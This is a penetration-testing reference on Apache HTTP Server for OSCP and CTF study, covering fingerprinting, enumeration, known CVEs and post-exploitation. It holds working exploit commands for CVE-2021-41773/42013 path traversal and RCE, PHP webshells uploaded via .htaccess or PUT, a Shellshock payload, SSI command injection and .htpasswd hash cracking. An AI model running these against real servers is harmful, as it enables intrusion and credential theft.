# Apache HTTP Server

> Web server reference for penetration testing. Covers detection, enumeration,
> known CVEs, exploitation patterns, misconfigurations, and post-exploitation.

---

## Table of Contents

- [1. Detection](#1-detection)
- [2. Enumeration](#2-enumeration)
- [3. Known CVEs](#3-known-cves)
- [4. Exploitation Patterns](#4-exploitation-patterns)
- [5. Misconfigurations](#5-misconfigurations)
- [6. Post-Exploitation](#6-post-exploitation)
- [7. OSCP Notes](#7-oscp-notes)
- [8. References](#8-references)

---

## 1. Detection

### Response headers

Request any page and inspect `Server` header:

```bash
curl -sI http://<TARGET>/ | grep -i server
```

Expected output:

```text
Server: Apache/2.4.49 (Unix) OpenSSL/1.1.1k
```

```http
# Apache typically sets these headers on error pages:
Server: Apache/2.4.49 (Ubuntu)
X-Powered-By: PHP/7.4.3
```

### Default error pages

Apache default 404 / 403 pages contain distinctive strings:

- `Apache/2.4.x (Debian)` footer
- `The requested URL was not found on this server.`
- `Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument`

### Default directory listing

If `Options +Indexes` is enabled, Apache renders an autoindex page titled
`Index of /<path>`. Look for:

```html
<title>Index of /uploads</title>
<pre><a href="?C=N;O=D">Name</a> ...
```

### nmap / whatweb

```bash
nmap -sV -p 80,443 --script http-headers,http-title,http-server-header <TARGET>
whatweb -a 3 http://<TARGET>/
```

---

## 2. Enumeration

### Version fingerprinting

Once you know the exact version, check for known CVEs (see section 3).

```bash
curl -sI http://<TARGET>/ | grep -i '^server:'
curl -s  http://<TARGET>/ | grep -i 'apache'
```

### Sensitive paths

Common Apache-exposed paths:

```bash
for p in server-status server-info .htaccess .htpasswd .git/config .svn/entries \
         phpinfo.php info.php test.php .env backup.zip; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>/$p")
  echo "$code  $p"
done
```

### mod_status / mod_info

If enabled (default `Allow from 127.0.0.1`, but often misconfigured):

```bash
curl -s http://<TARGET>/server-status?auto
curl -s http://<TARGET>/server-info
```

`server-status` leaks: current requests, client IPs, vhosts, worker state.
`server-info` leaks: loaded modules, config directives, file paths.

### Directory brute force

```bash
feroxbuster -u http://<TARGET>/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,bak
```

### Virtual hosts

```bash
gobuster vhost -u http://<TARGET>/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```

### HTTP methods

```bash
curl -s -X OPTIONS -i http://<TARGET>/ | grep -i allow
nmap -p 80 --script http-methods --script-args http-methods.url-path=/ <TARGET>
```

---

## 3. Known CVEs

### CVE-2021-41773 - Path traversal / RCE (2.4.49)

Path traversal via encoded `..%2e` in URL. When `mod_cgi` is enabled and
`Require all denied` is missing, leads to RCE.

```bash
# Path traversal
curl --path-as-is "http://<TARGET>/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"

# RCE via mod_cgi
curl --path-as-is "http://<TARGET>/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
  --data "echo; id"
```

NVD: https://nvd.nist.gov/vuln/detail/CVE-2021-41773
Affected: 2.4.49 only. Fixed in 2.4.50.

### CVE-2021-42013 - Path traversal / RCE (2.4.50 bypass)

Incomplete fix for CVE-2021-41773. Uses `%2e%2e` (double-encoded).

```bash
curl --path-as-is "http://<TARGET>/cgi-bin/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
curl --path-as-is "http://<TARGET>/cgi-bin/%2e%2e/%2e%2e/%2e%2e/bin/sh" --data "echo; id"
```

NVD: https://nvd.nist.gov/vuln/detail/CVE-2021-42013
Affected: 2.4.50 only. Fixed in 2.4.51.

### CVE-2019-0211 - Local privilege escalation

Race condition in `mod_prefork` (scoreboard). Local user -> root.
Requires Apache to be restarted regularly (e.g. logrotate), which is common.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2019-0211
Affected: 2.4.17 - 2.4.38.
Public exploit: https://github.com/cfreal/exploits/tree/master/CVE-2019-0211-apache

### CVE-2024-38476 - mod_proxy SSRF / information disclosure

SSRF via `mod_proxy`. When `mod_proxy` forwards to a backend, crafted
`RewriteRule` / `ProxyPassMatch` can leak local files or internal services.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2024-38476
Affected: 2.4.0 - 2.4.59.

### CVE-2017-15715 - File upload bypass (newline in filename)

`<FilesMatch>` bypass by appending `\x0A` (newline) to filename.
Allows uploading `.php\x0A` which Apache accepts as `.php`.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2017-15715
Affected: 2.4.0 - 2.4.29.

### CVE-2021-44790 - mod_lua buffer overflow

Heap buffer overflow in `mod_lua` multipart parser. Potential RCE.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2021-44790
Affected: 2.4.51 and earlier.

### Version -> CVE quick table

| Version | Traversal/RCE | LPE | Other |
|---------|---------------|-----|-------|
| 2.4.49 | CVE-2021-41773 | - | - |
| 2.4.50 | CVE-2021-42013 | - | - |
| 2.4.17-2.4.38 | - | CVE-2019-0211 | - |
| 2.4.0-2.4.59 | - | - | CVE-2024-38476 |
| 2.4.0-2.4.29 | - | - | CVE-2017-15715 |

---

## 4. Exploitation Patterns

### Path traversal via mod_cgi (CVE-2021-41773 / 42013)

Requires `mod_cgi` enabled AND `<Directory />` without `Require all denied`.
Default config has `Require all denied`, so this only works on misconfigured boxes.

```bash
# Read /etc/passwd
curl --path-as-is "http://<TARGET>/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"

# RCE
curl --path-as-is "http://<TARGET>/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
  --data "echo; id"
```

Expected output (traversal):

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

### .htaccess file upload -> RCE

If upload directory allows `.htaccess`, upload one that enables PHP execution:

```apache
AddType application/x-httpd-php .png
```

Then upload `shell.png` containing PHP code:

```php
<?php system($_GET['cmd']); ?>
```

Request: `http://<TARGET>/uploads/shell.png?cmd=id`

### mod_cgi shellshock (CVE-2014-6271)

If `mod_cgi` + bash < 4.3:

```bash
curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'id'" http://<TARGET>/cgi-bin/status
```

NVD: https://nvd.nist.gov/vuln/detail/CVE-2014-6271

### PUT method

If `<Limit PUT>` is not restricted:

```bash
curl -X PUT -d "<?php system($_GET[0]); ?>" http://<TARGET>/shell.php
curl http://<TARGET>/shell.php?0=id
```

---

## 5. Misconfigurations

### Directory listing

```bash
curl -s http://<TARGET>/uploads/ | grep -i 'index of'
```

### server-status exposed

```bash
curl -s http://<TARGET>/server-status
```

### .htpasswd accessible

```bash
curl -s http://<TARGET>/.htpasswd
# Crack with john:
john --wordlist=/usr/share/wordlists/rockyou.txt htpasswd.txt
```

### .git / .svn exposed

```bash
curl -s http://<TARGET>/.git/config
git-dumper http://<TARGET>/.git/ ./dump
```

### Symlink following

If `Options +FollowSymLinks` and an upload directory:

```bash
ln -s /etc/passwd link
# Upload link -> read /etc/passwd
```

### SSI injection

If `Options +Includes` and `.shtml`:

```html
<!--#exec cmd="id" -->
```

---

## 6. Post-Exploitation

### Config file locations

| OS | Path |
|----|------|
| Debian/Ubuntu | `/etc/apache2/apache2.conf` |
| Debian/Ubuntu (vhost) | `/etc/apache2/sites-enabled/*.conf` |
| Debian/Ubuntu (auth) | `/etc/apache2/.htpasswd` |
| RHEL/CentOS | `/etc/httpd/conf/httpd.conf` |
| RHEL/CentOS (vhost) | `/etc/httpd/conf.d/*.conf` |
| FreeBSD | `/usr/local/etc/apache24/httpd.conf` |

### What to look for in configs

```bash
grep -rE 'Auth|Require|ProxyPass|RewriteRule|SSLCertificate|VirtualHost' /etc/apache2/ /etc/httpd/ 2>/dev/null
```

Look for:
- `AuthUserFile` -> `.htpasswd` path -> hashes
- `ProxyPass` -> internal services reachable via proxy
- `SSLCertificateKeyFile` -> private key path
- `SetEnv` -> env vars with secrets
- `Alias` -> unusual mount points

### Log files

```bash
ls -la /var/log/apache2/ /var/log/httpd/ 2>/dev/null
tail -n 200 /var/log/apache2/access.log
```

Logs may contain: credentials in URLs, session IDs, uploaded paths.

### Credentials in .htpasswd

```bash
cat /etc/apache2/.htpasswd
# Format: user:$apr1$<salt>$<hash>  (MD5-crypt variant)
# Crack: hashcat -m 1600 htpasswd.txt rockyou.txt
```

---

## 7. OSCP Notes

> [!IMPORTANT]
> OSCP report: take a screenshot of the exact Server header (curl -I) - it proves the version you exploited.

> [!IMPORTANT]
> OSCP report: for CVE-2021-41773/42013, screenshot both the curl command AND the output showing /etc/passwd or `id`.

> [!IMPORTANT]
> OSCP report: if you pivot via Apache, screenshot the config file line that shows the ProxyPass or Alias you abused.

---

## 8. References

- Apache HTTP Server official docs - https://httpd.apache.org/docs/
- NVD search - https://nvd.nist.gov/vuln/search/results?query=apache+http+server
- CVE-2021-41773 writeup - https://blog.qualys.com/vulnerabilities-threat-research/2021/10/27/apache-http-server-path-traversal-remote-code-execution-cve-2021-41773
- CVE-2019-0211 exploit - https://github.com/cfreal/exploits/tree/master/CVE-2019-0211-apache
- GTFOBins - https://gtfobins.github.io/
- HackTricks - Apache - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/apache

---

*Reference for authorized penetration testing, CTF, and OSCP exam preparation only.*
